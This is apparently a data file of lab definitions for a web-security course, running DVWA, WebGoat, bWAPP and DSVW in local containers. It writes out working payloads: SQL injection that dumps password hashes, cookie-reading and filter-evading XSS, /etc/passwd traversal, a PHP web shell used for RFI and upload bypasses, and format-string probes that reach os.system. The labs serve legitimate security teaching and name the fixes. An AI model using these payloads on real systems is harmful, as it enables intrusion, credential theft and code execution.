              direction: "right",
              label: "GET ...view-someones-blog... id=2",
              payload: "changed object reference",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "another user's data returned",
            },
          ],
        },
      },
      {
        title: "Forced browsing to a privileged page",
        body: "Under A7 - Missing Function Level Access Control, a privileged page is reachable simply by navigating to its URL -- the app relied on not linking to it, not on an actual server-side role check.",
        diagram: {
          type: "browser-mockup",
          url: "/index.php?page=<privileged-page>",
          annotations: [
            {
              label: "No UI link",
              note: "page is never shown in the normal navigation",
            },
            {
              label: "Direct URL",
              note: "reachable with no admin login -- no server-side role check",
            },
          ],
        },
      },
      {
        title: "Raise the level, both are blocked",
        body: "Raising the security level and resending the exact same two requests shows the IDOR now returns only your own record and the privileged page rejects the unauthenticated request -- naming the check that now blocks each one is the actual finding.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "IDOR request resent",
              detail: "server now enforces an ownership check on the id",
            },
            {
              label: "Privileged page resent",
              detail: "server now enforces a role check on the function",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Both bugs share one root cause: authorization enforced only by obscurity -- a guessable id, an unlinked URL -- rather than a real server-side check. Hiding a page from the UI is not the same as protecting it, and the fix in both cases is an explicit server-side ownership/role check.",
      },
    ],
    hints: [
      "Neither step needs a password -- start at security level 0 with hints on, and look for a page that puts a user/account id straight in the request.",
      "For the IDOR, change only that id parameter to another value and see whose data comes back; for the second bug, look under A7 - Missing Function Level Access Control for a privileged page and try reaching it directly by URL.",
      "Once both work, raise the security level and resend the exact same two requests -- the server-side check that now blocks each one (ownership check, role check) is the actual finding.",
    ],
  },
  {
    id: "L27",
    number: 27,
    week: 9,
    moduleId: "m9",
    title: "DVWA: Complete SQLi & XSS all difficulty levels",
    description:
      "SQL injection and cross-site scripting remain two of the most exploited vulnerability classes in production web apps, and both let an attacker walk away with something the developer never intended to hand over: full password hashes via a UNION SELECT, or a victim's session cookie via a single unescaped <script> tag. This lab runs both attacks across DVWA's four security tiers, forcing the exact payload evolution real pentesters use against hardening WAFs and sanitizers -- from raw injection at Low, to Burp-intercepted numeric casts and split-tag evasion at Medium, to column-matched UNION queries and non-<script> vectors like <svg onload=> at High. At Impossible, the same payloads fail outright, isolating the two controls that actually stop these classes: PDO prepared statements and htmlspecialchars() output encoding. You'll leave able to both exploit SQLi/XSS through live filtering and name precisely which server-side control defeats each one.",
    objective:
      "Exploit SQL injection and reflected/stored XSS across DVWA's Low, Medium, and High security levels, then confirm at Impossible that PDO prepared statements and htmlspecialchars() defeat the same payloads.",
    successCriteria: [
      "Screenshots capture each successful exploit: SQLi dumping password hashes and XSS (reflected + stored) firing at Low, Medium, and High",
      "Payloads adapted per level: raw injection at Low, Burp-intercepted/split-tag evasion at Medium, column-matched UNION and non-<script> vectors at High",
      "One screenshot shows the same payloads rendered inert or rejected at Impossible",
      "One sentence per vulnerability names the exact control that stopped it (PDO prepared statements; htmlspecialchars() output encoding)",
    ],
    platform: "DVWA",
    difficulty: "medium",
    estimatedHours: 4,
    instructions: [
      `Start the DVWA container, log in with admin:password, click 'Create / Reset Database' if this is a fresh instance, then open DVWA Security and set the level to Low`,
      `SQL Injection (Low): in the User ID field submit 1' OR '1'='1 to dump all users, then submit 1' UNION SELECT user, password FROM users #  to extract the password hashes directly`,
      `XSS Reflected (Low): submit <script>alert(document.cookie)</script> in the name field; XSS Stored (Low): submit the same payload as a guestbook message and confirm it fires for every visitor who loads the page, not just you`,
      `Set Security to Medium. SQLi now casts the id parameter with a numeric-looking form field, so intercept the request in Burp Suite and inject directly into the raw POST body; XSS now strips the literal string '<script>', so bypass with a split tag like '<scr'+'ipt>alert(1)</scr'+'ipt>' or an event-handler payload such as <img src=x onerror=alert(1)>`,
      `Set Security to High. SQLi requires a UNION query with the correct column count wrapped inside the app's existing LIMIT 1 clause; XSS applies a case-insensitive regex against '<script>', so pivot to a non-script vector such as <svg onload=alert(1)> or <iframe src=javascript:alert(1)>`,
      `Set Security to Impossible. Confirm your prior SQLi payload now fails because DVWA switched to PDO prepared statements, and your XSS payload fails because output is passed through htmlspecialchars() before rendering -- write one sentence per vulnerability naming the exact control that stopped you`,
      `Capture a screenshot for each of the 8 successful exploits (SQLi + XSS-Reflected + XSS-Stored across Low/Medium/High, noting Stored XSS only needs to be shown once per level) plus one screenshot showing a blocked attempt at Impossible`,
    ],
    resources: [
      {
        title: "DVWA (Damn Vulnerable Web Application) source repo",
        url: "https://github.com/digininja/DVWA",
        type: "tool",
      },
      {
        title: "DVWA official container image (GitHub Container Registry)",
        url: "https://github.com/digininja/DVWA/pkgs/container/dvwa",
        type: "tool",
      },
      {
        title: "OWASP: SQL Injection",
        url: "https://owasp.org/www-community/attacks/SQL_Injection",
        type: "link",
      },
      {
        title: "OWASP: Cross Site Scripting (XSS)",
        url: "https://owasp.org/www-community/attacks/xss/",
        type: "link",
      },
    ],
    completionIndicator: `A set of screenshots showing: the DVWA SQL Injection page returning dumped username/password-hash rows at Low, Medium, and High security; the DVWA XSS (Reflected) page executing an alert()/showing document.cookie at each level; the DVWA XSS (Stored) guestbook entry firing the script automatically on reload; and a final Impossible-level attempt where the same payloads are rendered as inert text or rejected outright.`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Stand up DVWA and set Security to Low",
        body: "The DVWA container (ghcr.io/digininja/dvwa:latest, container port 80) is started, the database is created, and DVWA Security is set to Low as the baseline for the whole exercise.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:8080",
          containerLabel: "dvwa container",
          image: "ghcr.io/digininja/dvwa:latest",
          hostPort: 8080,
          containerPort: 80,
        },
      },
      {
        title: "Low: everything works unfiltered",
        body: "SQL Injection: 1' OR '1'='1 dumps all users, then 1' UNION SELECT user, password FROM users # extracts the password hashes directly. XSS Reflected and Stored: <script>alert(document.cookie)</script> fires in the name field and again as a guestbook message that persists for every visitor.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "DVWA (Low)",
          exchanges: [
            {
              direction: "right",
              label: "SQLi",
              payload: "1' UNION SELECT user, password FROM users #",
            },
            {
              direction: "right",
              label: "XSS",
              payload: "<script>alert(document.cookie)</script>",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "hashes dumped; script executes",
            },
          ],
        },
      },
      {
        title: "Rising defenses across security levels",
        body: "Medium casts id as numeric so the SQLi payload must be injected directly into the raw POST body via Burp, and strips the literal string '<script>' so XSS needs a split tag like '<scr'+'ipt>alert(1)</scr'+'ipt>' or <img src=x onerror=alert(1)>. High requires a UNION query matching the existing LIMIT 1 clause's column count, and its case-insensitive '<script>' regex pushes XSS to a non-script vector like <svg onload=alert(1)> or <iframe src=javascript:alert(1)>.",
        diagram: {
          type: "layer-stack",
          layers: [
            {
              label: "Low",
              detail: "no filtering -- payloads work unmodified",
            },
            {
              label: "Medium",
              detail: "numeric id cast + '<script>' string stripped",
            },
            {
              label: "High",
              detail:
                "UNION must match LIMIT 1 column count + case-insensitive '<script>' regex",
              highlighted: true,
            },
            {
              label: "Impossible",
              detail:
                "PDO prepared statements + htmlspecialchars() output encoding",
            },
          ],
        },
      },
      {
        title: "Impossible: the actual fix",
        body: "At Impossible, the same SQLi payload fails because DVWA switched to PDO prepared statements, and the same XSS payload fails because output is passed through htmlspecialchars() before rendering -- the two real fixes, not just stricter filtering.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "DVWA (Impossible)",
          exchanges: [
            {
              direction: "right",
              label: "same SQLi payload",
              payload: "1' UNION SELECT user, password FROM users #",
            },
            {
              direction: "left",
              label: "rejected",
              payload: "parameterized query -- no injection possible",
            },
            {
              direction: "right",
              label: "same XSS payload",
              payload: "<script>alert(document.cookie)</script>",
            },
            {
              direction: "left",
              label: "rendered as inert text",
              payload: "htmlspecialchars() encoded output",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "SQL injection and XSS are still routinely how attackers turn a single unsanitized input into a full data breach or session hijack -- the same UNION-based extraction and cookie-stealing script you just ran are the textbook techniques behind real credential dumps and account takeovers. Watching your own payloads survive Low, get intercepted and split at Medium, and get column-matched at High -- then die completely against prepared statements and htmlspecialchars() at Impossible -- proves in practice why input filtering alone never closes these classes, but query parameterization and output encoding do.",
      },
    ],
    hints: [
      "At Low security, the User ID field is a classic unescaped SQL query -- try breaking out of the intended string comparison as step 2 describes, and remember XSS at Low doesn't filter your script tags at all (step 3).",
      "At Medium, the SQLi id parameter now looks numeric on the page, so step 4 says to intercept in Burp and edit the raw POST body directly; for XSS, the literal string '<script>' gets stripped, so you need a payload that doesn't contain that exact substring intact.",
      "At High, step 5 says your UNION query must match the column count already baked into the app's LIMIT 1 clause, and the XSS filter is a case-insensitive regex on '<script>', so you need a vector that never spells out that tag at all -- like an event handler on a different element.",
      "At Impossible, nothing you tried before will work -- step 6 says to figure out and name the two specific server-side defenses (a parameterized-query approach and an output-encoding function) that are now blocking both attacks.",
    ],
  },
  {
    id: "L28",
    number: 28,
    week: 10,
    moduleId: "m10",
    title: "WebGoat: Server-Side Request Forgery lesson",
    description:
      "Server-side request forgery turns a feature that fetches a URL for you into a way to make the server request things it shouldn't -- internal endpoints, other users' resources, metadata services. WebGoat, OWASP's own training app, has a dedicated SSRF lesson under Request Forgeries that unlocks its green checkmark only when your tampered request actually reaches the forbidden resource -- so it grades the server-side fetch, not just your payload. You register your own account inside WebGoat, open the SSRF lesson, and modify the request's url parameter so the server fetches a resource other than the one the UI offered -- first pointing it at the internal/unintended resource the lesson gates on, then reasoning about why the server trusted a client-supplied destination at all. Because there is no external platform and no shared credentials, everything runs on the target this portal already stands up. You leave able to recognise any URL-fetching feature as a potential internal-network pivot and to describe the allow-list that closes it.",
    objective:
      "Learn to identify and exploit server-side request forgery in WebGoat's SSRF lesson by tampering with a URL parameter so the server fetches an unintended resource.",
    successCriteria: [
      "Registered a WebGoat account and opened the Server-Side Request Forgery lesson under Request Forgeries",
      "Modified the request's url parameter to make the server fetch the lesson's target/unintended resource",
      "WebGoat's lesson tracker shows a green 'Solved' indicator on the SSRF stage(s)",
      "Documented the working url value and why allow-list validation of the destination is the fix",
    ],
    platform: "WebGoat",
    difficulty: "medium",
    estimatedHours: 2,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat -- the bare root returns nothing, WebGoat lives under the /WebGoat path -- and register your own account (or log in with the account from an earlier WebGoat lab)`,
      `From the left menu, open the 'Request Forgeries' category and select the 'Server-Side Request Forgery' (SSRF) lesson`,
      `Work the first SSRF stage: use the in-page form (or intercept the request in Burp) that carries a url parameter the server fetches on your behalf, and observe which resource it requests by default`,
      `Change the url parameter so the server fetches the lesson's target resource instead of the intended one -- the lesson text tells you which resource proves the SSRF -- and submit it`,
      `Confirm WebGoat marks the stage solved with its green 'Solved' indicator, then complete any second SSRF stage in the same lesson the same way`,
      `Write two sentences: the exact url value that made the server fetch the unintended resource, and why validating the destination against an allow-list (rather than trusting the client-supplied URL) is the fix`,
      `Screenshot each stage's green 'Solved' indicator as you complete it`,
    ],
    resources: [
      {
        title: "WebGoat (GitHub)",
        url: "https://github.com/WebGoat/WebGoat",
        type: "tool",
      },
      {
        title: "OWASP WebGoat project page",
        url: "https://owasp.org/www-project-webgoat/",
        type: "link",
      },
      {
        title: "OWASP: Server-Side Request Forgery",
        url: "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
        type: "link",
      },
      {
        title: "OWASP SSRF Prevention Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `WebGoat's own lesson tracker showing a green 'Solved' indicator on the Server-Side Request Forgery lesson stage(s), with the tampered url parameter value that triggered the server-side fetch recorded.`,
    dockerImage: "webgoat/webgoat",
    containerPort: 8080,
    slides: [
      {
        title: "Register and find the SSRF lesson",
        body: "WebGoat runs entirely locally under the /WebGoat path -- register your own account, then open the 'Server-Side Request Forgery' lesson under the Request Forgeries category. No external platform or shared credentials.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080/WebGoat",
          containerLabel: "webgoat container",
          image: "webgoat/webgoat",
          hostPort: 18080,
          containerPort: 8080,
        },
      },
      {
        title: "The url parameter the server fetches",
        body: "The lesson's request carries a url parameter that the server itself fetches on your behalf, returning whatever that URL points at -- by default, the intended resource the UI offered.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "WebGoat (server-side fetch)",
          exchanges: [
            {
              direction: "right",
              label: "POST .../SSRF/task1",
              payload: "url=images/tom.png (intended resource)",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "server fetches and returns the intended resource",
            },
          ],
        },
      },
      {
        title: "Point it at the forbidden resource",
        body: "Changing the url parameter to the resource the lesson gates on makes the server fetch something it was never meant to -- WebGoat turns the checkmark green only when that server-side fetch actually reaches the unintended target.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Edit url parameter",
              detail: "point it at the lesson's target/unintended resource",
            },
            {
              label: "Server fetches it",
              detail: "the request is made from the server, not your browser",
            },
            {
              label: "Lesson solved",
              detail: "green 'Solved' indicator confirms the SSRF",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "A feature that fetches a client-supplied URL server-side can be steered at internal endpoints the public internet can't reach -- that's the SSRF pivot. The fix is not blocklisting bad strings but validating the destination against an allow-list of expected targets, since the server should decide where it connects, not the client.",
      },
    ],
    hints: [
      "Root returns nothing -- go to http://localhost:18080/WebGoat, register or log in, and find the SSRF lesson under the 'Request Forgeries' category.",
      "The lesson's request carries a url parameter the server fetches for you; the exercise text tells you which resource proves the SSRF -- change the parameter to point there.",
      "WebGoat only turns the checkmark green when the server actually fetched the unintended resource, so focus on the server-side request, not just the string you typed -- then describe the allow-list that would have blocked it.",
    ],
  },
  {
    id: "L29",
    number: 29,
    week: 10,
    moduleId: "m10",
    title: "DVWA: LFI/RFI File Inclusion",
    description:
      "An insecure include() or require() call is one path traversal payload away from leaking /etc/passwd, and one step further from full remote code execution -- the exact escalation this lab walks through on DVWA's File Inclusion module. You'll pull /etc/passwd via directory traversal at Low, then adapt the payload to survive Medium's single-pass '../' and 'http://' strip, before either including and executing a hosted PHP web shell over RFI (confirmed with a live ?cmd=id) or, when allow_url_include is disabled, escalating the same LFI to source disclosure via the php://filter wrapper. At High and Impossible, the same payloads are shut out entirely once the page parameter is locked to a fixed allow-list, showing exactly where the fix has to live. You walk away able to turn a file-inclusion bug into information disclosure or code execution, and to explain why an allow-list -- not a blacklist -- is what actually closes it.",
    objective:
      "Practice escalating a local/remote file inclusion vulnerability in DVWA from directory-traversal disclosure to remote code execution across increasing security levels.",
    successCriteria: [
      "Retrieved /etc/passwd via directory traversal at Low security",
      "Bypassed the single-pass 'http://'/'../' strip filter at Medium security to repeat the traversal",
      "Achieved code execution via RFI (or source disclosure via php://filter when RFI is unavailable) at Low security",
      "Confirmed the same payloads are blocked at High/Impossible due to the page parameter allow-list",
    ],
    platform: "DVWA",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Set DVWA Security to Low and open the File Inclusion module; note the page parameter loads local files by name, e.g. ?page=include.php`,
      `Perform LFI by directory traversal: request ?page=../../../../../../etc/passwd (add or remove ../ segments until the file resolves) and confirm the passwd contents are rendered in the page`,
      `Set Security to Medium; DVWA now strips the literal strings 'http://' and '../' once -- bypass with a payload that survives a single-pass strip, e.g. ....//....//....//....//....//....//etc/passwd or an absolute path like /etc/passwd directly`,
      `For RFI, first confirm allow_url_include is enabled in the container's php.ini (DVWA's default config enables it for this exercise); if disabled, note that as the real-world mitigation and skip to the LFI-to-RCE variant instead`,
      `Host a one-line PHP web shell (<?php system($_GET['cmd']); ?>) on a second local web server (e.g. python3 -m http.server 8000) reachable from the DVWA container`,
      `At Low security, set ?page=http://<your-host-ip>:8000/shell.php to include and execute the remote file, then confirm code execution with ?page=http://<your-host-ip>:8000/shell.php&cmd=id`,
      `If RFI is unavailable, instead escalate the LFI to code execution via PHP wrapper log poisoning or php://filter (e.g. ?page=php://filter/convert.base64-encode/resource=include.php) to read source code, decode it, and document the technique`,
      `Set Security to High and Impossible; confirm the page parameter is now restricted to a fixed allow-list (fi.php basic/include etc.) and document why the earlier payloads no longer work`,
    ],
    resources: [
      {
        title: "DVWA (Damn Vulnerable Web Application) source repo",
        url: "https://github.com/digininja/DVWA",
        type: "tool",
      },
      {
        title: "DVWA official container image (GitHub Container Registry)",
        url: "https://github.com/digininja/DVWA/pkgs/container/dvwa",
        type: "tool",
      },
      {
        title: "OWASP: Path Traversal",
        url: "https://owasp.org/www-community/attacks/Path_Traversal",
        type: "link",
      },
      {
        title: "PayloadsAllTheThings: File Inclusion / Path Traversal",
        url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal",
        type: "tool",
      },
    ],
    completionIndicator: `Screenshots showing the raw contents of /etc/passwd rendered inside the DVWA File Inclusion page via the traversal payload, plus either (a) command output such as uid=... from a successfully included remote shell (RFI) or (b) base64-decoded PHP source recovered via php://filter if RFI is disabled in the environment, with a one-line note on which path was used.`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Spin up DVWA and find the include point",
        body: "Set DVWA Security to Low and open the File Inclusion module; the page parameter loads local files by name (e.g. ?page=include.php), running from the ghcr.io/digininja/dvwa:latest container on port 80.",
        diagram: {
          type: "container-arch",
          hostLabel: "Host",
          containerLabel: "DVWA (Security: Low)",
          image: "ghcr.io/digininja/dvwa:latest",
          hostPort: 8080,
          containerPort: 80,
        },
      },
      {
        title: "LFI by directory traversal",
        body: "Request ?page=../../../../../../etc/passwd, adding or removing ../ segments until the file resolves, and confirm the raw contents of /etc/passwd are rendered in the page.",
        diagram: {
          type: "file-tree",
          root: "/",
          entries: [
            {
              path: "var/www/html/dvwa/vulnerabilities/fi/",
              depth: 1,
            },
            {
              path: "../../../../../../etc/passwd",
              depth: 1,
              flagged: true,
              note: "resolves via directory traversal",
            },
          ],
        },
      },
      {
        title: "Medium: survive the single-pass strip",
        body: "At Medium security DVWA strips the literal strings 'http://' and '../' once; bypass with a payload that survives a single pass, such as ....//....//....//....//....//....//etc/passwd, or request the absolute path /etc/passwd directly.",
        diagram: {
          type: "file-tree",
          root: "/",
          entries: [
            {
              path: "....//....//....//....//....//....//etc/passwd",
              depth: 1,
              flagged: true,
              note: "doubling ../ survives one strip pass",
            },
            {
              path: "/etc/passwd",
              depth: 1,
              flagged: true,
              note: "absolute path also works",
            },
          ],
        },
      },
      {
        title: "RFI: include and execute a remote shell",
        body: "Confirm allow_url_include is enabled (DVWA's default for this exercise), host <?php system($_GET['cmd']); ?> on a second server with python3 -m http.server 8000, then at Low security set ?page=http://<your-host-ip>:8000/shell.php&cmd=id to include and execute it remotely.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "you",
              label: "You",
              kind: "attacker",
            },
            {
              id: "dvwa",
              label: "DVWA container :80",
              kind: "server",
            },
            {
              id: "shell",
              label: "python3 -m http.server 8000 (shell.php)",
              kind: "server",
            },
          ],
          edges: [
            {
              from: "you",
              to: "dvwa",
              label: "?page=http://<host-ip>:8000/shell.php&cmd=id",
            },
            {
              from: "dvwa",
              to: "shell",
              label: "fetches & executes shell.php",
            },
          ],
        },
      },
      {
        title: "If RFI is disabled: escalate via php://filter",
        body: "When RFI is unavailable, escalate the LFI to code execution via php://filter/convert.base64-encode/resource=include.php to read the source code, decode it, and document the technique.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "DVWA File Inclusion module",
          exchanges: [
            {
              direction: "right",
              label:
                "GET ?page=php://filter/convert.base64-encode/resource=include.php",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "base64-encoded include.php source",
            },
          ],
        },
      },
      {
        title: "High/Impossible: the allow-list closes it",
        body: "At High and Impossible security the page parameter is restricted to a fixed allow-list (fi.php basic/include etc.), so document why the earlier traversal, strip-bypass, and wrapper payloads no longer work.",
        diagram: {
          type: "file-tree",
          root: "fi.php?page=",
          entries: [
            {
              path: "include.php",
              depth: 1,
              note: "allow-listed",
            },
            {
              path: "file1.php",
              depth: 1,
              note: "allow-listed",
            },
            {
              path: "file2.php",
              depth: 1,
              note: "allow-listed",
            },
            {
              path: "file3.php",
              depth: 1,
              note: "allow-listed",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Local and remote file inclusion bugs are how a single unchecked include() parameter turns into information disclosure or a full remote shell -- you proved both paths, pulling /etc/passwd through directory traversal and then executing an attacker-hosted PHP file over the network. Watching the same payloads that worked at Low and Medium get shut out completely by a fixed allow-list at High/Impossible is the concrete argument for why 'sanitize the input' is weaker than 'restrict to a known set of values' as a fix.",
      },
    ],
    hints: [
      "At Low, the page parameter just loads a local file by name (step 1) -- think about what happens if you feed it a relative path pointing outside the intended folder (step 2).",
      "At Medium, the app strips 'http://' and '../' but only once (step 3) -- a payload that still contains those substrings after a single removal pass will survive; an absolute path is another option mentioned.",
      "For RFI, first confirm allow_url_include is on (step 4), host your one-line PHP shell on a second local server (step 5), then point the page parameter at that shell's URL and add a command parameter to prove execution (step 6). If that's not available, step 7 points you toward reading source code through a PHP stream wrapper instead.",
      "At High/Impossible, none of the earlier payloads will work because the page parameter is now restricted to a fixed set of allowed values (step 8) -- your job there is to explain why, not to bypass it.",
    ],
  },
  {
    id: "L30",
    number: 30,
    week: 10,
    moduleId: "m10",
    title: "bWAPP: web-shell upload past extension and Content-Type checks",
    description:
      "An upload form that trusts the filename or the declared Content-Type instead of the file's actual contents is one of the shortest paths to remote code execution. bWAPP's Unrestricted File Upload page provides exactly that, and its security-level slider (low/medium/high) lets you watch a real, partial filter tighten across attempts. At low, you upload a one-line PHP web shell outright and trigger it with ?cmd=id. At medium, the app checks the declared Content-Type, so you resend the same bytes in Burp with the multipart header relabeled to image/jpeg. At high, an extension check forces an alternate PHP extension (.phtml/.php5) or a double-extension trick. Each round ends the same way -- browsing to the planted shell and running a command -- so you leave able to see that extension and Content-Type are both client-controlled metadata, not content validation, and to build the bypass each check demands.",
    objective:
      "Bypass bWAPP's file-upload filters at each security level to upload and execute a PHP web shell, showing that extension and Content-Type checks alone don't prevent RCE.",
    successCriteria: [
      "Uploaded and executed a PHP web shell at Low security, confirmed via ?cmd=id output",
      "Bypassed the Content-Type check at Medium security by relabeling the upload as image/jpeg",
      "Bypassed the extension check at High security using an alternate or double extension",
      "Recorded the exact bypass and resulting command output for each security level",
    ],
    platform: "bWAPP",
    difficulty: "hard",
    estimatedHours: 4,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/install.php once and click the install button to build bWAPP's database (a one-time step every fresh bWAPP container needs)`,
      `Log in with bWAPP's documented default credentials bee / bug, then set the security level (top right) to low`,
      `Open the 'Unrestricted File Upload' bug from the dropdown; create a one-line PHP web shell <?php system($_GET['cmd']); ?> as shell.php and upload it at low security`,
      `Follow the returned link to the uploaded file (bWAPP stores it under a path such as /images/), browse to it with ?cmd=id, and confirm the command output proves code execution`,
      `Raise the security level to medium and re-upload shell.php; when it is blocked on Content-Type, resend the upload in Burp Repeater with the multipart part's Content-Type changed to image/jpeg while leaving the PHP bytes unchanged, then re-trigger the shell`,
      `Raise the security level to high; when the extension is now checked, bypass it with an alternate executable extension such as shell.phtml or shell.php5 (or a double extension like shell.php.jpg where the server still executes it as PHP), then trigger the shell one more time`,
      `For each of the three levels, record the exact bypass used and the resulting ?cmd=id output`,
    ],
    resources: [
      {
        title: "bWAPP official page (itsecgames.com)",
        url: "http://www.itsecgames.com",
        type: "link",
      },
      {
        title: "bWAPP on Docker Hub",
        url: "https://hub.docker.com/r/raesene/bwapp",
        type: "tool",
      },
      {
        title: "OWASP: Unrestricted File Upload",
        url: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
        type: "link",
      },
      {
        title: "OWASP File Upload Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `Screenshots showing the bWAPP-hosted PHP shell returning ?cmd=id output at low security, plus the same code execution achieved after bypassing the medium Content-Type check (relabeled image/jpeg) and the high extension check (alternate/double extension), with the exact bypass noted per level.`,
    dockerImage: "raesene/bwapp",
    containerPort: 80,
    slides: [
      {
        title: "Install bWAPP, then upload at low",
        body: "Every fresh bWAPP container needs a one-time visit to /install.php. After logging in bee / bug at security level low, a plain shell.php uploads with no resistance -- the Unrestricted File Upload page does no real checking at all.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "bwapp container",
          image: "raesene/bwapp",
          hostPort: 18080,
          containerPort: 80,
        },
      },
      {
        title: "Trigger the shell with ?cmd=id",
        body: "Follow the link to the uploaded shell (stored under a path like /images/) and append ?cmd=id -- the returned command output confirms remote code execution from a single uploaded file.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "bWAPP (uploaded shell)",
          exchanges: [
            {
              direction: "right",
              label: "GET /images/shell.php?cmd=id",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "uid=... (command output -- RCE)",
            },
          ],
        },
      },
      {
        title: "Medium: flip the Content-Type",
        body: "At medium security the app checks the declared Content-Type. Resending the same PHP bytes in Burp Repeater with the multipart part relabeled image/jpeg slips the shell past the check unchanged.",
        diagram: {
          type: "request-response",
          leftLabel: "Attacker (Burp Repeater)",
          rightLabel: "bWAPP upload (medium)",
          exchanges: [
            {
              direction: "right",
              label: "POST /... (resent)",
              payload:
                "Content-Type: image/jpeg; bytes unchanged (<?php system($_GET['cmd']); ?>)",
            },
            {
              direction: "left",
              label: "200 OK -- shell stored, Content-Type check bypassed",
            },
          ],
        },
      },
      {
        title: "High: alternate / double extension",
        body: "At high security the extension itself is checked. An alternate executable extension such as .phtml or .php5, or a double extension like shell.php.jpg where the server still runs it as PHP, gets the shell in and executing one more time.",
        diagram: {
          type: "request-response",
          leftLabel: "Attacker",
          rightLabel: "bWAPP upload (high)",
          exchanges: [
            {
              direction: "right",
              label: "POST /... filename=shell.phtml",
              payload: "<?php system($_GET['cmd']); ?>",
            },
            {
              direction: "left",
              label: "200 OK -- stored and executed as PHP",
            },
          ],
        },
      },
      {
        title: "What you just proved",
        body: "Unrestricted file upload is a common real-world path to RCE precisely because extension and Content-Type are both metadata the client controls, not evidence of what a file contains. Defeating all three bWAPP levels -- no check, a Content-Type check, an extension check -- shows a file's declared type is never a substitute for validating its actual content and execution context.",
      },
    ],
    hints: [
      "Fresh bWAPP needs the one-time /install.php step, then log in bee / bug and set the level to low before you touch the Unrestricted File Upload page.",
      "At low, a plain shell.php uploads and runs -- follow its link and add ?cmd=id; at medium the block is on the declared Content-Type, so resend the same bytes in Burp with the part relabeled image/jpeg.",
      "At high the extension itself is checked -- try an alternate executable extension like .phtml or .php5 (or a double extension) that the server still runs as PHP, then trigger the shell again.",
    ],
  },
  {
    id: "L31",
    number: 31,
    week: 10,
    moduleId: "m10",
    title: "DSVW: server-side template injection, detect to code execution",
    description:
      "Server-side template injection happens when user input is rendered as template/format syntax instead of plain data, and how far it escalates depends entirely on which engine sits behind it. Damn Small Vulnerable Web exposes a template-injection endpoint (the tmpl parameter) inside its single small Python file, which makes it the cleanest place to walk the whole detect -> confirm -> escalate path and then read the exact code that caused it. DSVW does NOT use a Jinja2-style engine -- it feeds your input straight into Python's str.format() as the format string, with an open file object and the os module as the available arguments, so the payload syntax is single-brace format fields ({0.__class__}), not {{7*7}}. You send a probe to see whether your input is evaluated, confirm real evaluation by reading a field off one of those arguments, then walk attributes and indices to reach dangerous references such as os.system and disclose internal objects. (Python format-string injection can traverse attributes/keys but cannot itself call a function, so this is a runtime-reachability and information-disclosure primitive rather than one-request command execution.) Finally you open DSVW's source and find the .format() call that fed user input straight in as the format string. Because the vulnerable line and the exploit sit in the same readable file, you leave able to fingerprint an engine from its behaviour, reach the runtime through it, and name the code pattern behind it.",
    objective:
      "Detect, confirm, and escalate a server-side template injection vulnerability in DSVW's str.format() sink to reach the Python runtime.",
    successCriteria: [
      "Confirmed input evaluation with a single-brace format-field probe ({0.__class__})",
      "Escalated to reach a dangerous runtime reference (os.system) via the format-string object model",
      "Located the vulnerable tmpl.format() call in DSVW's source code",
      "Documented both payloads and the fix (never render untrusted input as the format string itself)",
    ],
    platform: "DSVW",
    difficulty: "hard",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/ to see DSVW's landing page listing its vulnerability categories, and locate the server-side template injection endpoint -- the tmpl parameter (i.e. /?tmpl=...)`,
      `Probe whether the input is evaluated rather than just echoed: submit a single-brace format field such as /?tmpl={0.__class__} and watch whether it renders as a Python class (evaluated) or is printed literally`,
      `Confirm real evaluation: /?tmpl={0.__class__} should return a class like <class '_io.TextIOWrapper'> -- proof your input is being consumed as a str.format() format string, not echoed. Note DSVW is NOT Jinja2, so a {{7*7}} payload just prints the literal {7*7}; single-brace format fields are the correct syntax here`,
      `Escalate by walking the format-string object model to reach the Python runtime: DSVW calls tmpl.format(open(__file__), os), so argument {1} is the os module -- /?tmpl={1.__dict__[system]} reaches os.system and renders <built-in function system>, proving the template can reach dangerous callables`,
      `Record what the format-string sink exposes -- reaching os.system via {1.__dict__[system]} and disclosing the open source-file object via {0} -- and note that pure str.format() syntax can traverse attributes/keys but cannot itself CALL a function, so this is runtime-reachability/info-disclosure rather than one-request command execution`,
      `Open DSVW's single-file source (linked in Resources, or view it inside the container) and find the render/format call that passed user input directly in as the format string -- the tmpl.format(open(__file__), os) line, with no sandboxing`,
